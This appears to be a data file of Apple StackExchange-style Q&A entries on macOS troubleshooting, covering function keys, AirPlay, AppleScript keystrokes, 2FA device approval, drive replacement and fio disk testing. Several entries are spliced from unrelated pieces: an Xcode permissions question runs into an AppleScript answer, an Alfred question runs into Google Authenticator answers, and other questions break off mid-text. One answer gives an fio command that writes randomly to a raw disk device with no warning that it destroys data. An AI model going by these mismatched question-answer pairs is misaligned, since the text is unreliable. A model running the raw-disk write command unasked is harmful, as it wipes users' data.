below).\nSteerMouse\nSteerMouse can then be used to adjust your sensitivity. It does require a license, but it also resolves the issue.\nSimply download and install the software, either from their homepage or by using e.g. Homebrew:\nbrew install --cask steermouse\n\nThe Cursor settings can then be adjusted to your liking.

Even on developer beta 8 (build 18A371a) this issue persists. \nOne of these things is the function keys, but only after a while. I tend to leave my MacBook Pro on overnight, and after that, the function keys stop working.\nI've tried killing SystemUIServer and letting it restart, but that doesn't seem to work. The only solution I've found is to reboot the computer.\nI'd like to be able to turn my keyboard backlight back on after closing the lid. I'd like to be able to adjust the volume without going to System Preferences.\nThe only keys that don't do anything are brightness, keyboard backlight, volume, etc, the ones that show a slider on the screen. The mission control key still works (enough, even though DB6 broke it horribly), the Launchpad key still works, media keys still work...\nIs there a way to fix my function keys without a reboot? Rebooting can be extremely cumbersome at times and a huge inconvenience.\nI have a normal, physical keyboard (thank god I don't have a touch bar), with physical function keys. Most of the controls work, and the ONLY controls that DON'T work are the ones that trigger sliders like the following to show on screen, which are the brightness, illumination (keyboard backlight), and volume controls:\n\nMy build number is 18A371a. When these keys stop working, some other things stop working as well, such as About This Mac, the sleep/restart/shutdown controls, the Messages app, as well as some other things. It really seems like some critical process is crashing, but I don't know what to restart.\n\nUpdate: I found which process is crashing, and I have submitted a bug report to Apple:\n\nThe Radar number is 4873261.\n\nA: It seems like loginwindow likes to crash sometimes on Mojave, so this may be your issue.\nTo fix it, you'll need to kill loginwindow using Activity Monitor. It will log you out, but should hopefully fix the issue. You can also use this terminal command:\nsudo killall -9 loginwindow\n\n\nAlso, if you are running any code injector, make that the first thing you shut off. It seems obvious, but it's happened.\n\nA: I would try just logging out to see if that restores the process that handles function keys. Be sure to run sysdiagnose right after you restart and then once when you find the keys not responding, since Apple would surely then be able to fix whatever process is crashing if you can document it during the beta process with evidence captured in the system diagnosis.\nThe log out process can signal to apps to clean up and is much faster than a restart of the whole OS (which also calls the log out process first). \n\nIf you're looking to track this down, try to determine if the failing process is user level or system level. Knowing that will help you with the quickest fix and help apple fix this in code for a next build.\n", "Q: Quit Apps While Using AirPlay I just purchased an Apple TV 4K to use with my iPhone 6s plus after my Chromecast broke. I just noticed that when casting movies to my tv using Airplay, I cannot close the app doing the casting. For example, the Hulu app on my phone, which supports Airplay, will let me switch to a different app while casting a movie. However, as soon as I quit the Hulu app (i.e. double press the home button and swipe up), Apple TV will no longer play the movie. This is very different from Chromecast because after casting the movie to Chromecast, it is the Chromecast that does the job of pulling the movie from its internet source, and I can freely quit the app without affecting the casting. In fact, when casting Hulu movies through chrome cast in the past, I could quit the Hulu app and the movie would still be playing.\nI understand that there is no need to quit iPhone apps, but that's not the point here.\nMy questions are:\n\n\n*\n\n*Does Apple TV, while performing Airplay, do the job of pulling the movies from the internet by itself, or does my iPhone have to do all the heavy lifting?\n\n*If Apple TV can get the movies from the internet sources, why do the apps on my iPhone have to stay active?\n\n*Is there a way to quit apps on my iPhone without affecting Airplay?\n\nA: Apple's Airplay uses a mirroring model. This is different than Google Chromecast's redirect model. \nWhen you play Hulu on your iPhone, the iPhone supplies the video to your Apple TV.  As you noticed, it's the iPhone doing the work. That's why you can't quit the app on your iPhone. \nApple can play video itself from just about all the same sources as your iPhone. The apps need to stay active on your iPhone when using Airplay because they don't hand-off that job to the Apple TV. To get around this, just use the apps in your Apple TV instead. \nGoogle's use of redirecting the task to the Chromecast also allows Google the ability to insert itself as the 'man in the middle' and see your viewing habits and shows so it can sell more advertising and monitize your use. Apple doesn't do this with Airplay. \n", "Q: Xcode Helper does not have the accessibility permissions needed to run tests I am getting this error when attempting to run some accessibility UTs on a project.

Could someone please help me with this? This is what I have at the moment\nset i to 0\nrepeat while i < 1.0E+300\n    set i to i + 1\n    delay 1.7\n    tell application \"System Events\" to keystroke \"c\"\nend repeat\n\n\nA: To start off, the number 1.0E+300 is a really REALLY big number.  That's  more than the number of atoms in the entire universe by several orders.\nYour script isn't far off.  To press \"c\" thirteen times, you can either do this:\nrepeat 13 times\n    tell application \"System Events\" to keystroke \"c\"\n    -- delay 0.1\nend repeat\n\n(you potentially need a small delay there to register individual keystrokes, but you can try it without and see which works);\nor you can do this:\ntell application \"System Events\" to keystroke \"ccccccccccccc\"\n\nwhich is the equivalent of the repeat loop without the delay.\nThe left and right arrow keys are key code 123 and key code 124, respectively.  So, adding those in between the keystrokes:\ntell application \"System Events\"\n    keystroke \"ccccccccccccc\"\n    delay 0.1\n    key code 123 -- left arrow\n    delay 0.1\n    keystroke \"ccccccccccccc\"\n    delay 0.1\n    key code 124 -- right arrow\nend tell\n\nOR:\ntell application \"System Events\"\n    repeat 13 times\n        keystroke \"c\"\n        delay 0.1\n    end repeat\n\n    key code 123 -- left arrow\n    delay 0.1\n\n    repeat 13 times\n        keystroke \"c\"\n        delay 0.1\n    end repeat\n\n    key code 124 -- right arrow\nend tell\n\nFinally, doing this ad infinitum on a loop at 1.7 second intervals, will produce something resembling this:\ntell application \"System Events\" to repeat\n    repeat 13 times\n        keystroke \"c\"\n        delay 0.1\n    end repeat\n\n    key code 123 -- left arrow\n    delay 0.1\n\n    repeat 13 times\n        keystroke \"c\"\n        delay 0.1\n    end repeat\n\n    key code 124 -- right arrow\n\n    delay 1.7\nend repeat\n\nNote that the outside-most repeat loop has no while, until, or times to limit its continuation.  It will loop forever, until you stop the script manually.\nI also didn't factor the 0.1-second delays into the overall 1.7-second delay.  The smaller delays will exceed 1.7 seconds in total, but I'll let you adjust the timings to your needs.\n", "Q: Replace optical drive with hard drive in mid 2012 non-retina MacBook Pro Is it OK to replace the optical drive with a hard drive or SSD on Macbook Pro 13-inch mid 2012 (non-retina)? I heard it's buggy.\nI have already replaced the hard drive with an SSD and it's now much faster.  I'm thinking of replacing the optical drive with a Hard drive or SSD and use it for secondary storage with a Kit you can get out there.  However, I heard it's not a very reliable fix and disconnects all the time or something like that?  Anyone could please give me any hints on this? \n\nA: I have heard of certain WD drives having hardware aggressive power saving features where the drive will shut down after a rather short period of inactivity. Worse, it doesn't tell the OS that it's doing so, so you get into a 'wait race' where the drive is waiting to be told to spin up, and the controller is waiting for the drive to signal 'ready'.\nThis usually isn't a problem if the computer shuts down the drive to save power:  It then knows that the drive isn't ready, and sends the appropriate startup.\nTry asking with more detail:  Drive, kit, etc.\n\nA: I have done this on that model of MBP. You need a purpose-built 'caddy', which is designed to house the SSD and to be the same shape as the removed optical drive. (And to stop you poking things through the drive slot.) OWC sells one called 'Data Doubler'. \nI had no issues whatsoever, and the Crucial SSD I used performed well. There is a problem with the SATA connection cables on these models becoming unreliable, which can cause data slow-downs or possible disconnections. That might be what you've heard. However, replacements for these internal cables are very cheap.\nThe other 'issue' is the task of disassembly to get the optical drive out and the new caddy in. If you do not reconnect the various little connectors (or if you break them), then obviously that will affect things. However, carefully following one of the many strip-down videos, such as on ifixit.com, should see you through.\n\nA: I have seen a lot of people taking this approach without any issues.\nI can confidently say, that if you use reliable and compatible components you should be fine.\n\nA: The first question to answer would be the link speed capabilities between the controller and the optical drive. This can be view using the System Information application. For example, my 2011 iMac shows the following for the optical drive.\n\nNegotiated Link Speed is 1.5 Gigabit which is normal since most optical drives transfer data at less than this speed. What is important is the Link Speed of 3 Gigabit which is the maximum for the controller. HDD's require at least 3 Gigabit and SSD's require 6 Gigabit to operate at their maximum transfer rate. Anything less will often still work, but the drive will not be able to transfer date at its maximum speed. So, it would be worth the money to replace my optical drive with a HDD but not a SSD. (In my opinion)\nMy 2011 iMac shows the following for the HDD drive.\n\nHere the Link Speed is 6 Gigabit, so a SDD replacement would be able to operate at its maximum transfer rate.\n\nNote: I do know that 2011 iMac's can accommodate an internal SSD without removing the existing HDD or optical drive. I just used my iMac as an example to make the above images.\n\n", "Q: Alfred doesn't see Simulator app I installed Alfred on a 10.13 machine a few days ago and it doesn't see Simulator app. \nI tried to reinstall Alfred, clear Alfred cache multiple times, rebuild Spotlight index.

Is there an easier way to solve this other than contacting each said website to reset my two factor authentication?\n\nA: Google Authenticator stores data in the Keychain and does not include such data in backups. You cannot recover your generators from a backup because they are not stored in the backup in the first place. You will need to perform the 2FA recovery steps for each service you no longer have access the 2FA to.\n\nA: I don’t use google authenticator, but you are correct you can always contact each account and get control of the multi factor setup link for each and re-enter it in to your app of choice.\nI use 1Password on iOS for my saved credentials and it allows several formats of backup:\n\n\n*\n\n*local backup to iOS and then iCloud / iTunes\n\n*cloud hosted storage of the secure vaults (some older users of 1Password used box.com or Dropbox.com or perhaps even google storage - but currently I think the vendor hosts all data as part of a subscription by default)\n\n\nYou should see the google authenticator documentation to see if they do any sort of backup that you could restore from iCloud / iTunes or another cloud storage system.\n", "Q: How can I stop documents from popping out of folders littering the desktop?

It doesn’t mean some people can’t do it, but that most people shouldn’t without some education and training and the willingness to start over if they mess up with one part. \nApple gear is so small and light that the internals can be tricky to repair so I’d take it to someone that does dozens of these swaps a week or more if you concern is about safe. \n", "Q: How do you boot verbosely when booting off an alternate device?

I did it from my Mac and all went well, until I got to the point where I had to verify my Mac from another device signed into iCloud. Well, the only other one of those was my iPad, which was out of battery power, so I plugged it in to charge and successfully verified it using my Mac. However, no approval dialog ever appeared on it and now I can't approve the Mac for the iCloud account. See screenshot:\n\nWhen I click \"Can't Approve\", I have to reset all End-to-End encyrpted data. I don't want to do that. How can I approve my Mac for use of my Apple ID after setting up two-factor authentication, without resetting encrypted data, when I don't receive the approval dialog on another device?\n\nA: (Solution for macOS 10.13.6 High Sierra; YMMV with other OS versions.)\nHoo boy, it was a looong process, but I just got it working! First I'll share some general useful tips that might help, and then I'll attempt to walk through the exact steps I went through to resolve the problem. If you're struggling with this, too, then you can do it. I believe in you!\nSo, first, some useful things to try in general:\n\n\n*\n\n*Restart your devices. This will force them to ask the Apple ID servers for re-authentication, and might clear up any erroneous cached data.\n\n*Turn it off and on again. No, seriously, turn off 2FA. This is your best bet at resetting things. Best in combination with the above. But how? Good question. The only way to turn it off nowadays is right after turning it on, from the email they send to every email address associated with your account when you turn it on. Click the link in the fourth paragraph entitled \"return to your previous security settings\":\n\n\n\n*\n\n*From here it will ask you to reset your password, and you'll have to answer your security questions again next time you log in, but two-factor auth will be completely off—server-side, anyway, your devices might still be confused. See below.\n\n\n\nNow, I'm going to go though the exact steps I followed to get out of this mess. Here, I'll refer to the Mac as, well, the Mac, and also a \"Second Device\"; this is the device that the Mac wants you to approve itself from. The Second Device can be an iPhone, an iPad, or any other Apple device that can receive 2FA verification codes. Here we go:\n\n\n*\n\n*First, turn off 2FA as outlined above. This is required. If for some reason you can't access the email they sent you, I'm 99% sure you're out of luck and will have to reset encrypted data. Please link multiple email addresses to your Apple ID in the future.\n\n*This whole issue seems to be caused by the Second Device being completely off when the Mac attempts to enable 2FA. That said, restart both the Mac and Second Device and make sure you are signed into iCloud on both.\n\n*Go to System Prefs on your Mac again. It will probably still have the \"approve your Mac\" nag, or some other text saying that you have to \"update your Apple ID details\" or whatever. Just click the \"Continue…\" button next to that.\n\n*Since 2FA is now definitively off on your account (even if the text on that previous screen might have suggested otherwise), it will prompt you to enable 2FA as if it were the first time. Click through the dialogs, saying yes, you want to enable 2FA. Enter your phone number and follow the standard steps.\n\n*After this is complete, it may ask you to log in again on both your Mac and Second Device. Do so on both now. If the Mac prompts you for the login password, don't enter it yet, you'll do that in the next step. If the Second Device needs verification (not \"approval\") with a 2FA code, click Allow on the Mac and enter the code on the Second Device as usual. If it requires \"approval\", you need to turn off 2FA and start again (because at this point, both devices want approval from the other. Turning off 2FA will stop the Second Device from asking approval, breaking that loop of death).\n\n*Make sure the Second Device is logged into iCloud. Make triple-sure.\n\n*Now, crossing your fingers, eyes and toes, enter your login password into the prompt on the Mac.\n\n*If the stars are aligned and all is well with the world, your Second Device has just asked you to approve your Mac for use with your iCloud account. Enter your Apple ID password and say \"Yes, I Approve\" or whatever.\n\n*The Mac should receive the message that it's been approved from the Second Device and stop nagging you.\n\n*If you got here following step-by-step, then congratulations, you've just done it! Two-factor authentication is enabled on your account and both devices are approved and ready to go. If you have any other Apple stuff signed into iCloud then you'll have to verify those, too, but this'll just need the standard SMS-able 2FA codes. It's only the one device on which you set up 2FA that's special and requires this \"approval\" step. If you ask me, Apple really needs to get their act together here with this special one-time step that has no easy or obvious \"out\" option; I'm no security architecture expert by any means, but… sigh.\n\n\nIf you're still struggling, just know that this took me four attempts involving turning 2FA off and on again, and trying different patterns of restarting and re-enabling 2FA on different devices, to finally get this solved. So, I ask you to keep trying. You might just get it. Good luck. :)\n", "Q: Cannot launch system with no battery icon I use a 2017 12\" MacBook. It suddenly shut out due to lack of battery.

To get into your Mac, your could boot to Recovery  (Option select Recovery) or into Single User mode (CommandS)\n\n\n*\n\n*Manually back up your data.  You will have to reinstall your apps and re-tweak your settings, but the most critical stuff (your data) will be preserved.  You can do this via Terminal:\ncp -R /Users/My_User_Name /Volumes/WD_Drive/My_User_Name_Backup\n\nChange My_User_Name and WD_Drive with the actual names of the folders.\n\n*Attempt to run Disk Utility with sudo permissions:\nsudo /Applications/Utilities/Disk\\ Utility.app/Contents/MacOS/Disk\\ Utility\n\n\n*Just use Migration Assistant from your new computer.

For instance, could I write some command followed by say https://github.com and it will automatically open a browser with that site through the http protocol?\n\nA: You could use the /usr/bin/open command to open websites from the command line.\nSimply entering open http://www.github.com would open GitHub in your default browser. \nYou can further specify which browser you would like to use, if perhaps it’s not the default one, by using the -a switch for the open command. For example, open -a \"Safari\" http://www.github.com would open GitHub in Safari even if your default browser is set to Chrome. \nThe open command is very powerful and can be used to launch all finds of stuff from the command line. I have an alias set to open Finder in whatever folder I pass as a parameter, so that when I type f ., it opens Finder in whatever directory I’m working in in Terminal. You could do the same with Google, with a bit of creativity, and pass on your search parameters from the command line. You can also use it to open documents in specific applications, or simply to start an application by typing open -a \"Preview\" for example. \n\nA: You can also browse the internet from within the terminal with browsers like Lynx (https://lynx.browser.org/), but from your question I'm not sure if this is what you want.\nLynx is commonly available for linux systems, and a quick google finds Lynxlet for Mac systems as well (https://habilis.net/lynxlet/).\nOnce installed, your command would be something like:\nopen -a Lynxlet https://github.com/\n\n", "Q: Can I pay for membership from another card? I'm apple developer. A few years ago I registered an account from one card. Can I pay for membership from another card?\n\nA: Yes.\nThe Apple Developer account isn’t locked to your credit card. You can make use of any valid/active credit card to make payment towards your membership renewal.\n", "Q: Can we capture a screenshot of vim window using Terminal?

I'm specifically interested in random reads and writes (as opposed to sequential reads and writes) as I want to make sure all of the physical components in the drive are stress tested.\nOne utility I've seen recommended for doing this is fio. However, I'm not sure what the correct way to use it is, particularly since most of the tutorials I've found assume you are running Linux. \nHow can I do this? I'm open answers for how to use fio or answers that recommend using another utility that can accomplish the same task.\n\nA: This seems to do the trick:\nsudo fio --name=randrw --time_based --runtime=86400 --ioengine=posixaio --iodepth=64 --rw=randrw --bs=64k  --direct=1 --numjobs=8 --size=[size of disk] --filename=/dev/rdisk#\nThat should do a random read/write test for 24 The # can be obtained with diskutil list and [size of disk] is obtained with diskutil info /dev/disk#. I'm not sure if the --size argument is actually necessary but I included it anyway.\n", "Q: Jetdrive 850 install on Macbook Pro 2015 I have a Macbook Pro 2015 that I bought used. When I bought it, OS 10.13 (High Sierra) was installed, but the SSD was failing. I bought a JetDrive 850 to replace it, and put the High Sierra installer on an external USB hard drive.\nWhen use the option key and choose \"Install macOS High Sierra\" from the USB drive, it takes me to the question mark folder.\nEdited to add: When I try to boot to internet recovery, I get an 2002F error, which apparently indicates an internet connectivity. However, my WiFi is working fine for other devices.\nWhat should I try?\n\nA: I fixed this by reformatting and recreating the Mac OS X High Sierra install disk using DiskMaker X.\nAfter that, I encountered another problem: the Transcend SSD had an MBR partition table, for which I needed these instructions on changing the partition scheme to GUID.\n\nA: You should try the following procedure as detailed in the Apple Support:\n\nIf your Mac doesn't start up\nIf your Mac starts up to a flashing question mark, but then doesn't\n  continue starting up, try these steps.\n1) Turn off your Mac by pressing and holding the power button for a few seconds.\n2) Press the power button once to turn your Mac back on. Immediately press and hold the Command and R keys on your keyboard to start your\n  Mac from macOS Recovery. Keep these two keys held down until you see\n  an Apple logo or globe. \n3) If prompted, select a Wi-Fi network to connect to the Internet as part of startup.\n4) After the macOS Utilities window appears, choose Startup Disk from the Apple menu.\n5) Select your startup disk, then click Restart.\nIf you don't see your startup disk in the Startup Disk window, close\n  the window and try the next sections of this article.\n[....]\n\n", "Q: How can I alter the default behavior of iTunes 10.7 to suppress some UI elements like the store? I like iTunes 10.7 and I've been sticking with it ever since it came out and hope to avoid updating it now that I run macos High Sierra.\nI'm trying to figure out how to delete/remove/hide the 'iTunes store / iTunes Match ' option in the left panel.\nI’m OK disabling SIP (system integrity protection, patching / modifying system frameworks - hex editing files, hacking on a plist file etc.. I've had luck with editing other apps this way such as calculator, but I knew what to look for.)\nWith iTunes I'm clueless. Has anyone reverse engineered this app or know specifically how to edit this specific version of iTunes on macOS?\n\nA: In the current version of iTunes (12.8), this is very easy:\n\n\n*\n\n*Go to iTunes > Preferences\n\n*Go to Restrictions\n\n*In the \"Disable\" list, check \"iTunes Store\"\n\n\nI would assume the same feature is present in iTunes 10.7, but given that it's six years old and I can't find a screenshot of its preferences window, I can't confirm that for sure.\n"]
